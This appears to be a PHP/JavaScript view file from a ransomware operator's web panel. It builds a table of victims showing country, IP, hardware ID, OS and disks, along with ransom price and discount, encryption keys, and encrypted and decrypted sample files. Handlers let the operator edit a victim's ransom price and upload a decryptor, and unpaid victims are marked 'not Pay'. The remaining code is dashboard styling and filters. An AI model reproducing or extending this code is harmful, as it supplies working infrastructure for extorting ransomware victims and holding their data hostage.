<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:42 AM
 */

?>

  <script>
      var baseUrl = "<?php echo base_url()?>";
      var dtdraw;
      function onEditDiscount(hwid){

      }
      function formatDate(d) {

               month = '' + (d.getMonth() + 1),
               day = '' + d.getDate(),
               year = d.getFullYear();
               hour = d.getHours();
               min = d.getMinutes();
               ss = d.getSeconds();

          if (month.length < 2) month = '0' + month;
          if (day.length < 2) day = '0' + day;
          date = [year, month, day].join('-');
          time = [hour, min, ss].join(':')
          return date +" "+time;
      }
      $(document).ready(function(){
          dtdraw =    $('#datatable').DataTable({
              "processing": true,
              "serverSide": true,
              "ajax": {
                  "url":"main/ajax_call"
                  ,"type": "GET"
                  ,"data":{
                      action:"get_ransomlist",
                      data : ""
                  }
              }
              ,"pagingType": "full_numbers"
              ,"lengthMenu": [
                  [10, 25, 50, -1],
                  [10, 25, 50, "All"]
              ],
              responsive: true,
              language: {
                  search: "_INPUT_",
                  searchPlaceholder: "Search records",
              }
              ,columnDefs: [{
                  "targets": 0,
                  "render": function (data, type, row) {
                      return row.country +"("+row.ipaddress + ")";
                  }
              }
              ,{
                  "targets": 1,
                  "render": function (data, type, row) {
                       var val = row.crc32 == "" ? "-" : row.crc32;
                      val += "<br>";
                      val += row.os == "" ? "-" : row.os;
                       return val;
                  }
              },{
                  "targets": 2,
                  "render": function (data, type, row) {
                      var html = row.price+'/'+row.discount+'&nbsp &nbsp &nbsp<i id="'+row.hwid+'" class="edit_price tim-icons icon-pencil"></i>';
                      return html;
                  }
              },{
                  "targets": 3,
                  "render": function (data, type, row) {
                      var myDate = new Date(1000*row.createdAt);
                      return formatDate(myDate);
                  }
              },{
                  "targets": 4,
                  "render": function (data, type, row) {

                      var dav = row.decryptedfile != null ? row.decryptedfile :"";
                      dav = dav != "" ? (baseUrl +"/upload/decrypted/"+dav) :"-";
                      var av = row.av != null ? row.av :"";
                      av = av != "" ? (baseUrl +"/upload/encrypted/"+av) :"-";
                      var val = av != "-" ? ('<a href="'+av+'" download>'+row.av+'</a>') : av;
                      val += "<br>";
                       val += dav != "-"  ? ('<a href="'+dav+'" download>'+row.decryptedfile+'</a>') : dav;

                      return val;

                  }
              },{
                  "targets": 5,
                  "render": function (data, type, row) {
                  	  var decryptor = row.decryptor != null ? row.decryptor :"";
                      decryptor = decryptor != "" ? (baseUrl +"/upload/decrypted/"+decryptor) :"-";

                      var val = decryptor != "-" ? ('<a href="'+decryptor+'" download>'+row.decryptor+'</a>') : decryptor;
                      if(row.status =="Encrypted")
                         val = "not Pay";
                      return val;

                  }
              },{
                  "targets": 6,
                  "render": function (data, type, row) {
                      return row.hdd;
                  }
              },{
                  "targets": 7,
                  "render": function (data, type, row) {
                      return row.status;
                  }
              },{
                  "targets": 8,
                  "render": function (data, type, row) {
                      var hwid = row.hwid;
                   var val = '<span class="btn btn-rose btn-round btn-file">';
                      val += '<i class="btn-link tim-icons icon-cloud-upload-94"></i>';
                      val += '<input type="file" id = "'+hwid+'" name="uploadavatar" class="uploadavatar" />';
                      val += ' </span>';


                      return val;
                  }
              },{
                  "targets": 9,
                  "render": function (data, type, row) {
                      var key = row.enckey ==null ? "-" : row.enckey;
                      var val = key.length > 177 ? key.substring(0,176) : key;
                      return val;
                  }
              }
              ],

          });
          dtdraw.on('change','tr td .uploadavatar',function(event){

              var hwid = $(this).prop("id");

              files = event.target.files;
              if(files.length > 0 ){

                  var formData = new FormData();
                  formData.append("file", files[0]);

                  var xhttp = new XMLHttpRequest();

                  // Set POST method and ajax file path
                  xhttp.open("POST", "../api/upload_file1.php", true);

                  // call on request changes state
                  xhttp.onreadystatechange = function() {
                      if (this.readyState == 4 && this.status == 200) {

                          var response = this.responseText;
                          if(response == "error")
                          {
                              alert("failed to upload file.");
                              return;
                          }
                          var params = {
                              action : "update_decryptor",
                              data : {
                                  hwid: hwid,
                                  filename: response,
                              },
                          }

                          $.ajax({
                              url: "main/ajax_call",
                              type: "POST",
                              dataType: "json",
                              data: params,
                              success: function onSuccess(res){
                                  dtdraw.draw();
                              },
                              error: function onError(res){
                                  alert("Error in File Upload!");
                                  console.log(res);
                              }
                          })
                      }
                  };

                  // Send request with data
                  xhttp.send(formData);

              }else{
                  alert("Please select a file");
              }
          });
          dtdraw.on('click','tr td .edit_price',function(event){

              var hwid = $(this).prop("id");

              var resultDiscount = prompt("Input your new base price. Must be a valid number.");
              if (resultDiscount.length<=0 || isNaN( resultDiscount ) ){
                  onEditDiscount(hwid);
                  return;
              }

              var params = {
                  "action" : "edit_price",
                  "data" : {
                      "hwid" : hwid,
                      "price" : resultDiscount,
                  },
              }
              console.log(params)
              $.ajax({
                  url: "main/ajax_call",
                  type: "POST",
                  dataType: "json",
                  data: params,
                  success: function onSuccess(res){

                      dtdraw.draw();
                  },
                  error: function onError(res){
                      console.log("Error in Edit Price!");
                      console.log(res);
                  }
              })
          });


      });



  </script>


  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');
        $navbar = $('.navbar');
        $main_panel = $('.main-panel');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');
        sidebar_mini_active = true;
        white_color = false;

        window_width = $(window).width();

        fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();



        $('.fixed-plugin a').click(function(event) {
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .background-color span').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data', new_color);
          }

          if ($main_panel.length != 0) {
            $main_panel.attr('data', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data', new_color);
          }
        });

        $('.switch-sidebar-mini input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            sidebar_mini_active = false;
            blackDashboard.showSidebarMessage('Sidebar mini deactivated...');
          } else {
            $('body').addClass('sidebar-mini');
            sidebar_mini_active = true;
            blackDashboard.showSidebarMessage('Sidebar mini activated...');
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);
        });

        $('.switch-change-color input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (white_color == true) {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').removeClass('white-content');
            }, 900);
            white_color = false;
          } else {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').addClass('white-content');
            }, 900);

            white_color = true;
          }


        });

        $('.light-badge').click(function() {
          $('body').addClass('white-content');
        });

        $('.dark-badge').click(function() {
          $('body').removeClass('white-content');
        });
      });
    });


    function onFilter(){
        var filters = {
            "country" : $('#filter-country').val(),
            "ipaddress" : $('#filter-ip').val(),
            //"hwid" : $('#filter-hwid').val(),
            "crc32" : $('#filter-crc32').val(),
            "date" : $('#filter-registration').val(),
            "price" : $('#filter-decryptprice').val(),
            "os" : $('#filter-os').val(),
            "testfile" : $('#filter-testfile').val(),
            "status" : $('#filter-status').val(),
        };
        location.replace("main?country=" + filters['country'] + "&ipaddress=" + filters['ipaddress'] + "&hwid=" + filters['hwid'] + "&date=" + filters['date'] + "&price=" + filters['price'] + "&os=" + filters['os'] + "&test=" + filters['testfile'] + "&status=" + filters['status']+ "&crc32=" + filters['crc32']);
    }

    function onReset(){
        location.replace("main");

    }
  </script>
